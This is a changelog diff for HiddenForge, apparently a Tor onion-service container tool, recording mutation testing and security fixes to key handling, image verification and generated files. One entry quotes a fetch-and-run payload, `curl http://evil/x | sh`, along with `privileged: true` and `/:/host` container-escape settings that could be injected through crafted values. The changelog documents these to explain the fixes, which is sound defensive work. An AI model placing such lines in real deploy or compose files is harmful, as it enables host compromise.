@@ -4,6 +4,250 @@ All notable changes to HiddenForge are documented here.
 
 ---
 
+## [Unreleased]
+
+Mutation testing works, and the code it found wrong is fixed. The previous
+artifact recorded 787 generated mutants and **0 checked**. A full run now reports
+**2,247 mutants, 2,175 killed (96.8%), 69 survived and every one of them
+explained in writing**, with zero mutants that no test reaches;
+`scripts/mutation_gate.py` fails the build on any survivor that is not accounted
+for, on any module that stopped being graded, and on any mutant that hangs
+without a written reason. It was itself checked for the opposite failure on each
+of those paths by removing an entry and confirming it goes red.
+
+Three things this work had left unmeasured are now measured rather than argued:
+the `mutation` CI job was executed end to end with `forgejo-runner exec` and
+reproduced the result from a clean hash-pinned venv (`Job succeeded`); the live
+acceptance suite ran against an image built from this tree and published a real
+`.onion` (3 passed in 244s); and the fuzz target was re-run, where it crashed on
+its second input and the bug was in the invariant. It compared line counts, and
+`shlex.quote` puts a newline inside single quotes, which adds a line while adding
+nothing executable. It now compares structure, the parsed YAML keys and the shell
+words, and ran 162,177 inputs clean.
+
+mutmut's own `timeout` verdict turned out not to be one: its bound is wall clock,
+and re-grading the 17 timeouts alone found 3 real hangs, 7 kills, and **7
+survivors the gate had been counting as caught**, two of which nothing explained.
+The gate now re-grades every timeout itself rather than trusting the label.
+
+A second pass, driven by running the real container rather than reading it, found
+eight more. The container was brought up from the shipped compose file and checked
+from the inside against `/proc`, and the key-handling commands were driven against
+a key volume the image itself generated.
+
+The two worst were in `restore`, the command an operator reaches for when the
+identity is already lost. It reported `ok: true` over an archive that decrypted
+but carried no key at all, leaving an empty volume behind a success message; and
+it accepted member names carrying control characters, the one input channel into
+the key volume that skipped the name validation `--keys` and `--name` both get.
+
+The third was in CI rather than in the code, and it hid the most serious defect
+this project has had. PyYAML was in no CI requirement file, so the two tests that
+prove a crafted `--keys` cannot smuggle `privileged: true` or `/:/host` into the
+operator's compose file called `pytest.importorskip` and silently skipped. The
+mutation spot-check is what caught it: the container-escape mutation came back
+SURVIVED in CI and killed locally. The dependency is now pinned with hashes, and
+those two tests fail loudly rather than skipping if it is ever absent again.
+
+Fifteen defects were found: seven because a mutation of them survived, five by
+reading `scripts/hiddenforge` (which mutmut cannot mutate, because it has no
+`.py` extension), and three by taking a single finding and asking the same
+question of its whole family. The most serious are all in the key-handling and
+supply-chain paths: a restore that followed a symlinked directory already in the
+key volume, a `--delete-plaintext` that destroyed an unrecoverable identity
+without verifying the archive, a `verify-image` that printed VERIFIED for a
+stripped post-quantum signature, and `--keys` and `--container` values that were
+both injectable into the compose fragment and the 0755 deploy script.
+
+### Fixed
+- **`restore` reported success over an archive holding no identity.** An archive
+  that decrypted but carried no `hs_ed25519_secret_key` and no encrypted key
+  envelope produced `ok: true` and an empty key volume. That is the worst answer
+  this command can give: the operator reads success, believes the identity is
+  back, and the only remaining copy may be the one they are about to delete. A
+  .onion address IS its key and there is no reissuing it. Now refused before
+  anything is written, so a bad archive cannot half-populate the volume either.
+  The envelope case is covered deliberately, with a round-trip test, because a
+  volume encrypted with `--delete-plaintext` holds no plaintext key and refusing
+  to restore THAT would have been the worse bug.
+- **`restore` accepted control characters in archive member names.** The archive
+  is the one input channel that reaches the key volume without passing the name
+  validation `--keys` and `--name` both get, and these names become directories
+  and are printed back by `show`, `status` and `doctor`. A newline splits a line
+  of operator output in two; an ESC sequence rewrites the terminal it is printed
+  to. Refused with the same rule `validate_keys_dir` applies.
+- **The healthcheck's `process_up` was the constant `true`.** `manifest.json`
+  advertises it to integrators beside fields that do mean something, and it read
+  as a statement about the Tor process while being documented as "always true if
+  this executes". Measured against the image: a container with no Tor in it at
+  all reported `process_up: true`. It now matches the daemon on argv[0], which a
+  running container says is the bare name `tor` rather than an absolute path --
+  checked rather than assumed, because matching `/usr/bin/tor` would have made
+  the field permanently false on a healthy service. Vanguards runs with
+  `--control_socket /var/lib/tor/control.sock`, so a looser substring test finds
+  the addon and calls it the daemon; there is a test for that too.
+- **The capability drop failed entirely under rootless Podman.** `capset`
+  refuses a permitted set that is not a subset of the current one, and the
+  supervisor asked to keep `DAC_OVERRIDE|SETUID|SETGID` unconditionally. This
+  project's own `podman-compose.yml` deliberately withholds DAC_OVERRIDE, so the
+  call was refused and **nothing was dropped**: the supervisor kept CHOWN for the
+  life of the container, on the runtime the deployed instance actually runs.
+  Reproduced from the shipped file, which logged "could not drop setup
+  capabilities: Operation not permitted". The request is now narrowed to what the
+  runtime granted, so the drop succeeds and CHOWN goes; measured afterwards, the
+  Podman supervisor holds `0xc0` (SETGID, SETUID) where it used to hold CHOWN as
+  well, and Docker is unchanged at `0xc2`.
+- **`verify-image` reported `ok: true` for an image it had only half checked.**
+  The human output has always said VERIFIED, BUT NOT COMPLETELY when the ML-DSA
+  half could not be checked, while the JSON offered only `ok`, which means
+  "nothing that ran failed". A deploy gate keying on it ships an image whose
+  post-quantum signature was never verified because `pqsign` happened not to be
+  installed on the runner -- signature-stripping arriving through the verifier's
+  reporting rather than through the signature. The document now carries
+  `complete`, and `docs/INTEGRATION.md` says to gate on `ok and complete`.
+- **The CI `build-and-test` job failed on its second run on a self-hosted
+  runner.** The vanity smoke test wrote to a fixed `/tmp/hf-keys`, which survives
+  between jobs there, so the next run found the previous run's key and `vanity`
+  refused it -- correctly, since a key IS the address. The job then failed for a
+  reason that had nothing to do with the commit. It now uses a fresh directory
+  per run and removes it; passing `--force` instead would have suppressed exactly
+  the refusal worth keeping. The four CI venvs are created with `--clear` for the
+  same reason: on a persistent runner a package dropped from the lock file
+  otherwise stays installed.
+- **PyYAML was in no CI requirement file, so the container-escape guard skipped.**
+  The two tests that prove a crafted `--keys` or `--container` cannot smuggle
+  `privileged: true` or `/:/host` into the operator's compose file work by
+  PARSING the output, and they called `pytest.importorskip("yaml")`. In CI the
+  parser was absent, both skipped, and the suite reported green having checked
+  nothing. Caught by the mutation spot-check, which reported the container-escape
+  mutation SURVIVED in CI while it was killed locally. PyYAML and its stubs are
+  now pinned with hashes in `requirements-ci.txt`, and the two tests raise
+  instead of skipping if it ever goes missing again.
+- **A hostname file was sanitised, then published.** `_publish_addresses` decoded
+  with `errors='ignore'`, which deletes any non-ASCII byte and matches what is
+  left: a `hostname` holding one stray byte beside a valid address published an
+  address that was not what the file said. Now decoded strictly (inside a guard,
+  because an escaping `UnicodeDecodeError` would kill the supervision loop) and
+  skipped if it is not clean ASCII.
+- **`vanity.py` exited 2 for a lost race, not the documented 3.** `manifest.json`,
+  `hiddenforge info` and the module's own docstring all say exit 3 means "a key
+  appeared at the output path while a search was running". `main()` caught
+  `FileExistsError` and returned 2, "usage, validation, or environment error",
+  sending an automated caller to the wrong remedy. Now a `KeyRaceError`
+  (a `FileExistsError` subclass, so existing callers still catch it) with its own
+  arm returning 3.
+- **`vanity._harden` could have its chmod redirected by a symlink.** It tested
+  `p.is_symlink()` and then chmod'ed by path, which re-resolves the name. Every
+  mode and owner is now set with `fchmod`/`fchown` on an `O_NOFOLLOW` descriptor,
+  including the key directory itself, matching what `entrypoint.py` already did.
+- **`_write_dropped_mappings` chowned by path and left its mode to the umask.**
+  Now `fchown` on the descriptor it wrote through, and an explicit `fchmod(0o600)`
+  so the mode is a guarantee rather than a request the umask happens to narrow.
+- **`--container` was injectable into the compose fragment and `deploy.sh` too.**
+  The same hole as `--keys`, one interpolation over, in the same file: the
+  container name becomes a YAML key, so a crafted value put `privileged: true` on
+  the tor service and added a second service beside it. Found by auditing every
+  interpolation in both generators rather than only the one a mutant pointed at.
+  It is now validated with the `validate_container` that already existed, quoted
+  for the shell, and `--onion-port` is range-checked at `setup` time instead of
+  producing a compose file whose service the container silently drops at boot.
+- **`show` reported an address the container would not serve.** `address_for`
+  returned whatever the `hostname` file said without ever comparing it to the
+  public key, which IS the address. A key set assembled from two services, or a
+  partial restore, therefore produced an address the operator would publish while
+  Tor, which rewrites `hostname` from the key at startup, served a different one.
+  The document now carries `derived_matches` (`true`/`false`/`null` for "could
+  not tell"), `onion` and `source` are unchanged so the contract holds, and
+  `doctor` fails a key set whose two halves disagree.
+- **`doctor` failed the capability check on this project's own
+  `podman-compose.yml`.** It demanded all five capabilities on every runtime,
+  while that file deliberately grants three: under rootless Podman container root
+  maps to the invoking host user, so the bind-mounted key volume is already
+  writable and neither DAC_OVERRIDE nor FOWNER is needed. The deployed instance
+  runs podman, so the recommended configuration reported FAILED. The requirement
+  is now runtime-aware, and rootlessness is asked of the engine rather than
+  assumed, with any unclear answer leaving the strict set in force.
+- **The `--keys` path was injectable into both files `setup` generates.**
+  `--image` and `--container` were validated and this was not. A crafted value
+  produced a `compose.service.yml` carrying `privileged: true` and `/:/host` --
+  a container escape in a file the operator merges with their own compose.yml --
+  and a `deploy.sh` (written 0755, and the README tells them to run it)
+  containing `curl http://evil/x | sh`. Both reproduced. The YAML scalar is now
+  emitted with `json.dumps`, the shell path with `shlex.quote`, and
+  `validate_keys_dir` refuses control characters. The golden files moved by
+  exactly two lines, both the new quoting.
+- **`verify-image` printed VERIFIED for an image whose post-quantum signature had
+  been stripped.** The ML-DSA verdict is tri-state and only `False` counted as a
+  failure, so deleting `sambent-mldsa.pub` from a signature directory downgraded
+  the hybrid scheme to a single classical signature in silence. One half present
+  without the other is now a failure; a set that genuinely has no post-quantum
+  half, or a machine without `pqsign`, is reported as NOT CHECKED (a new
+  `unchecked` field in the JSON, and `VERIFIED, BUT NOT COMPLETELY` on the human
+  line).
+- **`encrypt-key --delete-plaintext` destroyed the only copy of an onion identity
+  without verifying the archive.** It wrote the ciphertext and immediately
+  `rmtree`d the plaintext, on the strength of gpg's exit status. It now reads the
+  file back, decrypts it and compares SHA-256 against the tar it encrypted before
+  removing anything, `fsync`s the write, and refuses to delete at all when the
+  read-back cannot be made (age decrypts only from a TTY). Every other destructive
+  path in this project archives rather than deletes; this was the exception, on
+  the one artifact whose loss is permanent.
+- **`decrypt-key` had `restore`'s destination traversal too** and is fixed the
+  same way.
+- **`restore` followed a symlinked directory that was already in the key volume.**
+  It refuses archive members that are symlinks and names that are absolute or
+  contain `..`, all of which are about the ARCHIVE. A destination volume already
+  holding `app -> /somewhere/else` turned the member `app/hs_ed25519_secret_key`
+  into a write outside the volume; `O_NOFOLLOW` on the final component does not
+  help when the traversal is in its parent. Reproduced, then fixed: the volume is
+  opened `O_DIRECTORY|O_NOFOLLOW` and every component, the conflict scan, the
+  archive-aside rename and the extraction are now descriptor-relative.
+- **The key-volume size budget was checked after the file was read.**
+  `_tar_keys` in `scripts/hiddenforge` did `data = path.read_bytes()` and only then
+  compared the running total against its 512 MB limit, so one oversized file was
+  already in memory before the guard ran. It walks an operator-supplied volume the
+  threat model allows to have been restored from untrusted media. Now it asks
+  `stat()` first.
+- **`tests/test_subprocess_timeouts.py` read the mutated source tree**, so it
+  failed on an unmutated baseline and aborted mutmut's statistics pass (`-x`).
+  With no statistics every mutant maps to zero tests, which is exactly the
+  "787 generated, 0 checked" artifact. It now uses `loader.repo_root()`.
+
+### Added
+- **`scripts/mutation_gate.py`**: reads `mutmut results` and fails unless every
+  surviving mutant is in an allowlist with a written reason. Mutants are keyed on
+  their diff rather than mutmut's positional name, which renumbers on any edit.
+- **A `mutation` CI job** (tag and daily schedule only, ~10 minutes) running the
+  full pass and the gate, with its own hash-pinned venv
+  (`requirements-mutation.txt`): mutmut pulls in thirteen packages the lint and
+  unit jobs have no reason to trust.
+- **Tests for four surfaces that had none.** `healthcheck.py` and the
+  `vanity.py` generator path had no unit tests at all; `_drop_setup_capabilities`
+  and `_service_reachable` had no test touching any of their mutants, including
+  the one that inverts the publication gate. Also `dispatch_subcommand`'s
+  privilege decision, `generate_basic_torrc`, `wait_for_socket`,
+  `start_vanguards`, and the whole startup sequence of `main()`.
+- **`tests/fake_mkp224o.py`**, a stand-in that speaks the real generator's command
+  line and writes a real Tor key directory from the published test vector, so
+  `vanity.py`'s refusals are exercised rather than mocked.
+
+### Changed
+- `entrypoint.py` names `KEYS_ROOT`, `TORRC_PATH` and `DATA_DIR` once instead of
+  spelling the same two paths out six times, and `healthcheck.py` names
+  `PROC_ROOT`. These were what made `generate_basic_torrc` and
+  `_vanguards_running` untestable outside a container.
+- `tests/conftest.py` runs every test from a throwaway working directory, and
+  `tests/loader.py` gained `source_path()` so a test loads the copy of a module
+  that mutmut actually mutated. Without it, `vanity.py`'s 772 mutants would all
+  have survived while the report called the file tested.
+- `scripts/mutation_spotcheck.py` is re-scoped to `scripts/hiddenforge`, the one
+  file mutmut cannot mutate (no `.py` extension), and its docstring withdraws the
+  claim that mutmut's full run was unreliable here. It was not: the run was being
+  started with `python -m mutmut`, which re-imports `mutmut.__main__` from inside
+  the injected trampoline and dies on `set_start_method`.
+
+---
+
 ## [2.1.0] - 2026-09-11
 
 Machine-first adoption: hiddenforge can now be integrated by a program, and the
